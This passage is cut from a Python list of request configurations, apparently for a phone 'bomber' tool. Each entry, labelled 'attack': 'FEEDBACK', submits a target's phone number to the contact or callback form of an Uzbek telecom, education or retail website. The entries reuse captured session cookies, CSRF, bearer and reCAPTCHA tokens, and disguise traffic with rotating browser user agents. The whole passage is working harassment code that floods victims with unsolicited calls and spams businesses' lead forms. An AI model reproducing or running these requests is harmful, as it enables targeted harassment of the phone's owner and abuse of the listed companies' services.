            'cookies': {'XSRF-TOKEN': 'eyJpdiI6Imx3NU9wWVo2emlLRVBhNG44R2l3aXc9PSIsInZhbHVlIjoiRndNekIrMXV5TUtsMTVxcXlzQ3g3akduYVl4OVBuRXh5ZU8wbGxSbCt6M0t2azZ4U080RWpPVTRhYS9GZlFqYzRUTHI0MFZ3Z2ordjBEVTZhV2VCNlV5eTZiS2ZHK0MyYnNLdy9jRUtJYm82R2FzS2FjUnhncWdHY3gxMlJzdE0iLCJtYWMiOiIwNTMzODNmYTA2YTJhMTdiMzc5MGNmMjAwMjg5NGVjZjI1MWYxYWY2MDNiYWFmOTgyMzdmNDgwOTVhNTc1YjkxIiwidGFnIjoiIn0%3D', 'sharqtelekom_session': 'eyJpdiI6IkdETlhiMStCV3ZscVgzTTBLWnFrOVE9PSIsInZhbHVlIjoidFdERlM5ek9ISnAwZllFQ1UxRjlTTXJkNnZiQVhIMjZuVEkvMlFhVXlqMjRPOWU3UFhGS1dCcEJCcGt3Rzh5TnZIQVlEaEphc2VlR3FVbXVuT21KZUJabWcxQjhqQmd3Q0lMbW5tdGhPaVN6azVLZFZGcExhTy9YQWpZazRjL2IiLCJtYWMiOiJlODFmYTQxZWQ3ZmE0YzYxM2I3OGM1Yzg3YTExNGM2YWIxNWZkZTFlMzY0MmNiNzkzNjBiYTVlODU4MDUyMzM1IiwidGFnIjoiIn0%3D', '_gcl_au': '1.1.1038568596.1688067869', '_ga_1KQLB4SNZC': 'GS1.1.1688067869.1.0.1688067869.0.0.0', '_ga': 'GA1.1.913451694.1688067869', '_ym_uid': '1688067870446105499', '_ym_d': '1688067870', '_ym_isad': '1', '_ym_visorc': 'w', '_fbp': 'fb.1.1688067870727.1657682720'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://st.uz', 'Referer': 'https://st.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-CSRF-TOKEN': 'oredczCftNuUCz9OnsSywobHE2UhOG8ux0zqJ689', 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': f'_token=oredczCftNuUCz9OnsSywobHE2UhOG8ux0zqJ689&type=application&vacancy_id=&name=INSIDE&phone=+998 ({str(number)[3:5]}) {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}&text=INSIDE',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Yurtur-Zangiota.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://yurtur-zangiota.uz/create',
            'cookies': {'XSRF-TOKEN': 'eyJpdiI6Ikxjd09seC9iMlZ1aEZlMERxZ2p4NWc9PSIsInZhbHVlIjoiRStua1JCeng1dGc0T3hWRXg0QmNMZnRvNGdhK0Iva25ka3NleHIzVWhFQkpub004QXlIa01zVUhyUjFYaXlWRDVteFY1YW5lcWQyMmdRWFVUNmxqZmdVc1JYdlBSdTl4Vi9FTlo0V01UaWRYSVYrVUpIUjJHSmpjZXRzL2xvNW0iLCJtYWMiOiIzNDRlNzJmNDU2MGY5NzMyMzE0YzYwMTJmYjNhY2FkMDE1MzVjNDNiZmIzMzYxYTVjZjk1Njk3ODQ0YzlhMTI4IiwidGFnIjoiIn0%3D', 'laravel_session': 'eyJpdiI6IlpVOHFVbnlTMEt4aWVaVXUzenRqZHc9PSIsInZhbHVlIjoiZzhLSGZzREZ5dnBIR0JXbEttTXRYMys4TkJIUld1NDF2N1VJdVh0RklOOEduNEEybG1TWk1zN3JsaVlTdW9EajlDUVBCQ2VRR2ZFV2orNGNCck41K3dHeHkvMWVoME84KytNNkxzdUxFK0JRT1pwKzBUa1VNKzVLL3ZqZ0s5RkYiLCJtYWMiOiI0MTVmMGE1OThiMDc0YjY4ZDAwODExNDY3NDI3YWVkY2E3NjVmZWI0NjhlNDZiNmRiNzYyZDRkMmViNWM4Zjg4IiwidGFnIjoiIn0%3D', '_ym_uid': '1688068203480110385', '_ym_d': '1688068203', '_ym_isad': '1',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'http://yurtur-zangiota.uz', 'Referer': 'http://yurtur-zangiota.uz/contacts', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1],},
            'data': {'_token': 'XO3TMGCbN1qx7lngFxvMquJcgSdPiFAvplnIYAPk', 'user_name': 'INSIDE', 'user_phone': number, 'user_text': 'INSIDE',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Comnet.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://serv.comnet.uz/api/oformzayavi',
            'headers': {'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru,en;q=0.9', 'Authorization': 'Bearer 3|YOz6gV9lvSlVao1VfTzboRMDSpipDNuSMeSLaNFo', 'Connection': 'keep-alive', 'Content-Type': 'application/json', 'Origin': 'https://comnet.uz', 'Referer': 'https://comnet.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'json': {'name': 'INSIDE', 'city': 'фергана', 'phone': str(number)[3:], 'tariff_name': 'ECONOM+', 'business': 0,},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Sarkor.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://sarkor.uz/api/v1/billing/online_request',
            'cookies': {'_ym_uid': '1688093261454723415', '_ym_d': '1688093261', '_ga': 'GA1.2.432345412.1688093262', '_gid': 'GA1.2.2146675148.1688093262', '_gat_gtag_UA_133165416_1': '1', '_gat': '1', '_ym_isad': '1', '_gcl_au': '1.1.1190969104.1688093262', '_fbp': 'fb.1.1688093262114.1358305347', '_ym_visorc': 'w',},
            'headers': {'authority': 'sarkor.uz', 'accept': 'application/json, text/plain, */*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/json', 'origin': 'https://sarkor.uz', 'referer': 'https://sarkor.uz/rus', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'z-statistic': 'c2b43ca89b23e2e5be2779813959d4c2', 'z-time': '1688093294795',},
            'json': {'name': 'INSIDE', 'phone': f'+998-{str(number)[3:5]}-{str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}', 'extra_phone': '', 'note': 'Выбран адрес: INSIDE', 'District': None, 'token': '03AAYGu2SktjB1v46-Mo7Bwuld58lHcY1O0Uk2-ZZiGk33eL5CifWYwrhqEWA_tJf6RRX2lw-w1nVb1Qu7lA8stbao53X7yw-1ZcT9_jcMZAcN0mcO84j7eJDCWscO9wUinxjkDpGeMiwvyt0c9Qi91T9K7fqHWqQ2vDoPsKtw23IVE6wsI0B_aZevdiVQyx5aZhYC6B6349GKkAwkon9DsWgoEaFm6Snibjsw4VEvnHGMlgcf0DzrdGuxFII8EeMVLxrVbfmoSY_pnB6Wk4bWIEK7T5WZL4sI6uyMY5CwbKbrsa0ThZkckgYg71rlJNlM9jGephrc1DhuNM2h-EpjA3tzzcRN8ze0K6cKK_5_me-xRLnf7gxp06F5KJSzvO6J_kkCULcnjXTLur0QIgiCYULuR2Cle27nPVkWp_Pm_RkLrlHaqGuV3voNOOg9duhdLy87eYEt1nuV44AYCd185X5vEb6zz9pvb4RxlHXsuPYIR4nacJPGq9rY-lm8jxBEMHsziAA7rc8F-tyuDln2Nh1IVzUkaa-EEA',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Valstatex.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://api.emailjs.com/api/v1.0/email/send-form',
            'headers': {'authority': 'api.emailjs.com', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryLd4B4yLSNhWt3ysQ', 'origin': 'https://valstatex.uz', 'referer': 'https://valstatex.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'cross-site', 'user-agent': user_agent()[1],},
            'data': f'------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="phone"\r\n\r\n{number}\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="email"\r\n\r\n{email()}\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="message"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="lib_version"\r\n\r\n3.5.0\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="service_id"\r\n\r\nservice_seklhhi\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="template_id"\r\n\r\ntemplate_my6arlq\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ\r\nContent-Disposition: form-data; name="user_id"\r\n\r\nDs6m4Zr3oflenGPhn\r\n------WebKitFormBoundaryLd4B4yLSNhWt3ysQ--\r\n',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'SPI.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://spi.uz/send/',
            'cookies': {'csrftoken': 'eaBp67tW8qvNDRs02f1aXBlyxZLVUGQOzEGCV9p1VUFS4KVktBqQ4hw39EYsjlqN',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://spi.uz', 'Referer': 'https://spi.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'csrfmiddlewaretoken': 'eS4gJRhAAsmUR3BTacErtxtmuxa2wWk4zm9tyTdFnWwZiW4dBy37AdER6cnzVBU3', 'service': 'Интернет', 'district': 'Шайхантахурский', 'street': 'Кадыри', 'home': '15', 'apartment': '7', 'name': 'INSIDE', 'promotion': 'False', 'phone': str(number)[3:], 'phone2': '', '': '', 'undefined': 'undefined',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Cron.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://cron.uz/js/send.php',
            'cookies': {'_fbp': 'fb.1.1688094565840.2133380535',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://cron.uz', 'Referer': 'https://cron.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'data': {'type': 'main', 'name': 'INSIDE', 'phone': number, 'message': 'INSIDE',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'TuronTelecom.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://turontelecom.uz/api/ticket/store',
            'cookies': {'utm_source': 'https%3A%2F%2Fturontelecom.uz%2Fru%2Ffast-connect', 'readNews': 'eyJpdiI6IkZXcTFaVTdKOWhoQ1V5SHh3RDZNdkE9PSIsInZhbHVlIjoia0pNdjhpMDdFUk9Xd2U1T2RZUkFHOVphTjJXeDhMMEt3NXBEUXpuNmFpMVg2U0FGTHNMemdjUnhUdlRpNmdobCIsIm1hYyI6IjA4ODhjOTdlMTdlNWNlMGJmOTY4Yjk5OWUwN2RiZjU2NzBjM2VjZWJmNGQzMzcxNGE4MDE4MTY0NzNhZDNjYjIifQ%3D%3D', 'city_id': 'eyJpdiI6Im1DVVNxMTY0WUNOZ0Q3ZWxNMGNkSVE9PSIsInZhbHVlIjoiekZEMWpNbFRKQUN5M290anRtNnhuQ1NVVDI4NURMa2xONDNPYS9RMEd6QS9RTHJOTEpxQTVEbVNCck5teGQ1SiIsIm1hYyI6IjdjNmM1MjBhNTc4ZmNmNWFiYjY5MDljZjRhOGQ3MDE4Y2Q0MmEwYjdlYTBlNjgwYTViNDQ4NDYxZTNlNTlhYzgifQ%3D%3D', 'lang': 'eyJpdiI6IkRsNHVSV1hZU0Q3dVZPajUydk52Z1E9PSIsInZhbHVlIjoiQ0c4V3M5Q2V0Yk1LV1BleGd3RW9SSDJ4UytRSVhzdGFXbk9wT2FHYjErTDhnc1laMFRpNDhlMnlrM1JIcGpEayIsIm1hYyI6ImUxZmVjMGRiNTUxZTI0MDYzMjU3NjIwOGU5N2JkYWMyMTgxYWVkZGI5NGQyMmZhNTE3MTQ2MjJiMTBlZWU0ZTIifQ%3D%3D', 'XSRF-TOKEN': 'eyJpdiI6IkFqeGRMbWNEdE1DUzc1MnFMR2RTcHc9PSIsInZhbHVlIjoiZnVxYWYvMnFYWnZPRFNsT2FNa3BLcTNVR3o1Vnd3S3VEN08zWDdPcWpTQ0p6aGFmVW9Ua0REalRHZXZDczA4cjcrck9Rd0t1N3NIUjJCZ3JjMWRoeTZRSkJmS01rd0FqMURrUHpyWlZhbzBUc3h3eEtXTkNmNXVhbmQ4b0lHOWsiLCJtYWMiOiI4MGE1MzVmYjUxZmU1MDBkOTE2MmNhMzI0NmYxNTkwOGQ2MWIzODFjMjEzN2Q3N2E0NWVkMjk1YTI4MjcwOTc5In0%3D', 'turon_telecom_session': 'eyJpdiI6IkR5TTFYMXZHOFAxN1J1WFU2aGRaQ2c9PSIsInZhbHVlIjoiVVJnRDJrcndRa3Z1NVBQNWN5UGFrY0FwN2Z0U3kzOXg2OXFNYnNBZmhYQ3VWUlBoR1kwOGhZaWxIbjZEcjZaUWVPYklVSTB1RG5vU0pWMk9CUUFodFd2cjhxS1ppQzdtTU13YktYUmRLMjNDRFdNbnBMVDNuYmh2NFZZM0tWZTgiLCJtYWMiOiJlZGZkODkxZTFkMDAzMGVhODYzYTdmYjNhZDIwMzQzOTRmNGM5MWRhMTM0NGU0ZDZiYzIyYTkzOTVmYmJjNTZkIn0%3D', '_gcl_au': '1.1.1804757548.1688094767', '_ga': 'GA1.1.1997060168.1688094767', '_ym_uid': '1688094767442418856', '_ym_d': '1688094767', '_ym_isad': '1', '_fbp': 'fb.1.1688094767545.689314370', '_ym_visorc': 'w', 'clv_UserID_143167': 'dc67a314-e362-5ccd-11e9-55b57c5c3268.143167', '_ga_DGMPFBKPTW': 'GS1.1.1688094766.1.0.1688094773.0.0.0'},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'https://turontelecom.uz', 'Referer': 'https://turontelecom.uz/ru/fast-connect', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': {'type': 'internet', 'language': 'ru', 'utm_source': '', 'name': 'INSIDE', 'phone_number': f'+998 {str(number)[3:5]} {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}', 'city_id': '1', 'district_id': '2', 'address': 'INSIDE',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Koinot-TV.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://koinot-tv.uz/connection/connection.php',
            'cookies': {'articles-visitor': 'sb194da19a9874cajiu2qcmp34',},
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Origin': 'http://koinot-tv.uz', 'Referer': 'http://koinot-tv.uz/connection/index.htm', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest',},
            'data': f'subject=%D0%97%D0%B0%D1%8F%D0%B2%D0%BA%D0%B0+%D0%BD%D0%B0+%D0%BF%D0%BE%D0%B4%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5&youremail={email()}&name=INSIDE&phone=+998 ({str(number)[3:5]}) {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}&option=%D0%98%D0%BD%D1%82%D0%B5%D1%80%D0%BD%D0%B5%D1%82&message=INSIDE',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'ARS.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'http://ars.uz/wp-json/contact-form-7/v1/contact-forms/351/feedback',
            'headers': {'Accept': 'application/json, text/javascript, */*; q=0.01', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryLoC0milNfWHB8x3A', 'Origin': 'http://ars.uz', 'Referer': 'http://ars.uz/', 'User-Agent': user_agent()[1], 'X-Requested-With': 'XMLHttpRequest',},
            'data': f'------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n351\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.1.7\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nru_RU\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f351-o1\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n0\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="g-recaptcha-response"\r\n\r\n03AAYGu2SS2OS1Bx7iuHi0czT5veS3vWMubgV9ncogsPMaqSTsuMRfIjbD9yecAV38cb5QGE-p-Ybrwdgv5rlujHRhBZMBxVd-dcpHu3RQBGzsJCmvwzwYfPaWD7_-nfIZZZGmUD1tRfg9vD1VaMWhkCzjBTiuXty8HVv4MVKbJ5TwbUyP6GYzNMYpcrg3S-OY8FOecDwj95c2JxBWTzElP6OqUk_huQolGgUp8RvQPmDN8SU14iHdJ7CMv8jHRG6Yo2rZtxC5gdmse1K-9puatVgTOPTuC35K_n3jkVcyyjuKUBBS9mSIpztX3sWgWY-D6KY3xiGmcwwySbW0lv8BPnZFfXL23WY2fR2Yo_-XdMMxpG7nHzlJxojemMHsZCRmOWc6rCUpkX_osQ1PzJaep6_2NLtlZBBt7uzIE58V90_oXHX8Ht58l0xDxOA8gswbGtIrkZyOG3ksJjjNtyREj9_k--1foIG1qZqUQdCaf_mfyMzHuqBSaizKdEg6m-0CJXn28nDrQf5hiClDk9x6yRnAqS_5qpMc0A\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="your-name"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="tel-708"\r\n\r\n+998({str(number)[3:5]}){str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="your-subject"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="your-message"\r\n\r\nINSIDE\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="checkbox-67[]"\r\n\r\nСоглашаюсь на обработку моих данных.\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="wpcf7tg_sending"\r\n\r\n1\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A\r\nContent-Disposition: form-data; name="pum_form_popup_id"\r\n\r\n184\r\n------WebKitFormBoundaryLoC0milNfWHB8x3A--\r\n'.encode(),
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'SevenPlus.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://sevenplus.uz/quiz/thank-you.php',
            'cookies': {'PHPSESSID': '8a3314a700eb7581eef80738f4ed7e3a', '_fbp': 'fb.1.1688095931193.1164570532',},
            'headers': {'authority': 'sevenplus.uz', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'accept-language': 'ru,en;q=0.9', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://sevenplus.uz', 'referer': 'https://sevenplus.uz/quiz/fill-form.php?city=tashkent', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': user_agent()[1],},
            'data': {'name': 'INSIDE', 'number': str(number)[3:],},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'ILM.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://ilm.uz/',
            'cookies': {'akademy-app': 'foteuap12f6ptclpj0oec0t6lu', '_csrf-frontend': '70a6a20d70befd936b336f1b33ff96e033a058b80cefcb826a8d2bf53233e9bca%3A2%3A%7Bi%3A0%3Bs%3A14%3A%22_csrf-frontend%22%3Bi%3A1%3Bs%3A32%3A%22DqfYDdfTyzdZgTZKeOhxKsu47sCkRrtB%22%3B%7D',},
            'headers': {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'ru,en;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://ilm.uz', 'Referer': 'https://ilm.uz/', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'same-origin', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'},
            'data': {'_csrf-frontend': 'jYI9TyXOSedovRH3zTcMAoAT2VpE0jW5j6rAqpOeuJ7J81sWYaovsxHHda2qY1ZJ5VyxIg-hQI242YPBwezM3A==', 'Orders[name]': 'INSIDE', 'Orders[phone]': number, 'Orders[course_id]': '7',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Global-Edu.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://fastapi.modme.uz/api/v1/leads/lead',
            'headers': {'Accept': '*/*', 'Accept-Language': 'ru,en;q=0.9', 'Connection': 'keep-alive', 'Origin': 'https://global-edu.uz', 'Referer': 'https://global-edu.uz/', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'cross-site', 'User-Agent': user_agent()[1], 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"',},
            'params': {'section': 'Web', 'branch_id': '2691', 'name': 'INSIDE', 'phone': str(number)[3:], 'course': 'IELTS', 'comment': 'INSIDE',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Bizninguylar.uz', 'anonymous': 'Yes'},
            'method': 'get',
            'url': f'https://bizninguylar.uz/messages/create?name=INSIDE&phone=+998 ({str(number)[3:5]}) {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}',
            'cookies': {'XSRF-TOKEN': 'eyJpdiI6ImRFYnk0dE5LSG9zaW9IZDFzQXo0K2c9PSIsInZhbHVlIjoiU0JPb0ZrbWtqWm9HSEpCMGgyV1BDc1lqNVdjWUxEaVIrQWVvbGJhbytRVHVVQkRBRERUUng2Ky9jUWlUaG1hb2FTblBWekRpVkdxUWpSRzZXTDhVUXN0aTJuZ1p6aHBIRXZNcWgwMGJrM2FYZjFwQUwzaU9BY3lJZFdDbzNqN3YiLCJtYWMiOiIxYjk3MzE5OGIyYTJiYmQ1YmZlODkwNjA3ZjM1MmVjNmQ3M2NlZjQyYTY1ZmNmYTAxYzAxNmNiMTY5Yjk3ZDE4IiwidGFnIjoiIn0%3D', 'laravel_session': 'eyJpdiI6Ims2bTBtN1RtTWZoYzVwclIrOUF2OHc9PSIsInZhbHVlIjoidURFaUt1ZmNiVDdnTWNTbDlSQi9NTTd0bHNockN3ejFRTkN1Ync0dHJFejEwamZmT2dLUW4zemt6aEppU3JIbUU1QlNJUmZmKzFRRkpUVGY3SElaN0FzT2QzRGhjZW0vYzFyQzZkbzhkbGk1UXVLQTVYd2ZnRXlpRXhjRTBFYXkiLCJtYWMiOiI0MTJmY2ZhZWM1MWVmZTlhNGJjZTdmMWY4M2YyMjliMGY5ODgzNTc3ZGE3ZTE1YmNjY2Q3N2RhNzliNDk4ZTFkIiwidGFnIjoiIn0%3D', '_gid': 'GA1.2.385894825.1688097031', '_ga': 'GA1.1.981890537.1688097031', '_fbp': 'fb.1.1688097031041.831446763', '_ym_uid': '1688097048847060058', '_ym_d': '1688097048', '_ym_isad': '1', '_gat_gtag_UA_139722595_1': '1', '_ga_M01B9B9SBP': 'GS1.1.1688097030.1.1.1688097100.0.0.0',},
            'headers': {'authority': 'bizninguylar.uz', 'accept': 'application/json, text/javascript, */*; q=0.01', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/json; charset=utf-8', 'referer': 'https://bizninguylar.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Itex.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://itex.uz/answer.php',
            'cookies': {'_ym_uid': '1688101151152907115', '_ym_d': '1688101151', '_ym_isad': '1',},
            'headers': {'authority': 'itex.uz', 'accept': '*/*', 'accept-language': 'ru,en;q=0.9', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'origin': 'https://itex.uz', 'referer': 'https://itex.uz/', 'sec-ch-ua': '"Chromium";v="112", "YaBrowser";v="23", "Not:A-Brand";v="99"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': user_agent()[1], 'x-requested-with': 'XMLHttpRequest',},
            'data': f'form=topform&name=INSIDE&tell=+998({str(number)[3:5]}) {str(number)[5:8]}-{str(number)[8:10]}-{str(number)[10:]}',
        },
        {
            'info': {'country': 'UZ', 'attack': 'FEEDBACK', 'website': 'Healthyfood.uz', 'anonymous': 'Yes'},
            'method': 'post',
            'url': 'https://forms.tildacdn.com/procces/',
